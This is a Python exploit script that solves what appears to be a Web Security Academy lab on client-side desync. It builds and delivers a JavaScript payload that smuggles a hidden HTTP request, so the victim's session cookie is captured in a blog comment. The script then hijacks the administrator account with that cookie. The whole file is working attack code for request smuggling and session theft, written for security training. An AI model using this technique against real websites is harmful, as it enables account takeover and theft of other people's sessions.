import sys
import requests
import re
from bs4 import BeautifulSoup
import urllib3

# Disable SSL warnings for simplicity (not recommended for production)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Client-side desync
def Store_Delivered_Payload(Stored_Payload, server_exploit):
    """
    Delivers the payload to the victim via the exploit server.
    """
    try:
        # Headers to mimic a legitimate browser request
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
        }
        
        # Data to be sent to the exploit server
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8",
            "responseBody": Stored_Payload,
            "formAction": "DELIVER_TO_VICTIM"
        }
        
        # Send the payload to the exploit server
        response = requests.post(server_exploit, data=data, headers=headers, verify=False)
        
        # Check if the payload was delivered successfully
        if response.status_code == 200:
            print("(+) Stored payload successfully.")
            print("(+) Extracting session cookie...")
        else:
            print("(-) Error while trying to deliver payload!")
            sys.exit()
    except Exception as e:
        print(f"(-) Error: {e}")

def Get_Exploit_CsrfToken(target_host):
    """
    Extracts the CSRF token, exploit server link, and session value from the target host.
    """
    url = f"https://{target_host}/en/post?postId=7"
    response = requests.get(url, verify=False)
    
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Extract the CSRF token from the input field
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    
    # Extract the exploit server link from the anchor tag
    exploit_server = soup.find("a", {"id": "exploit-link"})["href"]
    
    # Extract the session cookie from the response
    session = response.cookies.values()[0]
    
    return csrf_token, exploit_server, session

def ClientSideDesync(target_host, csrf_token, server_exploit, session):
    """
    Performs the client-side desync attack by injecting a malicious payload.
    """
    # JavaScript payload to perform the attack
    Stored_Payload = (
        f'<script>\r\n'
        f'fetch("https://{target_host}/", {{\r\n'
        f'method: "POST",\r\n'
        f'body: "POST /en/post/comment HTTP/1.1\\r\\nHost: {target_host}\\r\\nCookie: session={session}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 820\\r\\nConnection: close\\r\\n\\r\\ncsrf={csrf_token}&postId=7&name=test&email=yes@duck.com&website=http://ham.com&comment=test,",\r\n'
        f'credentials: "include",\r\n'
        f'mode: "cors",\r\n'
        f'}}).catch(() => {{\r\n'
        f'fetch("https://{target_host}/en", {{\r\n'
        f'mode: "no-cors",\r\n'
        f'credentials: "include",\r\n'
        f'}});\r\n'
        f'}});\r\n'
        '</script>'
    )
    
    # Deliver the payload to the victim
    Store_Delivered_Payload(Stored_Payload, server_exploit)
    
    # Check if the session was successfully hijacked
    response_session = requests.get(f"https://{target_host}/en/post?postId=7", verify=False)
    if "Victim" in response_session.text:
        print("(+) Session Found")
        
        # Extract the session cookie from the response
        extracted_session = re.findall(r"session=.*;", response_session.text)[-1]
        print(f"(+) {extracted_session}")
        
        # Use the extracted session to access the victim's account
        headers = {"Cookie": extracted_session}
        login_response = requests.get(f"https://{target_host}/my-account", headers=headers, verify=False)
        
        # Check if the login was successful
        if "administrator" in login_response.text:
            print("(+) Logged in as administrator successfully.")
            print("(+) Lab Solved Successfully.")
        else:
            print("(-) Login failed!")
            sys.exit()
    else:
        print("(-) Session not found!")
        print('(!) Use another lab session!')
        sys.exit()

def main():
    """
    Main function to execute the script.
    """
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(1)
    
    target_host = sys.argv[1]
    print("(+) Starting...")
    
    # Extract CSRF token, exploit server link, and session
    csrf_token, server_exploit, session = Get_Exploit_CsrfToken(target_host)
    
    # Perform the client-side desync attack
    ClientSideDesync(target_host, csrf_token, server_exploit, session)

if __name__ == "__main__":
    main()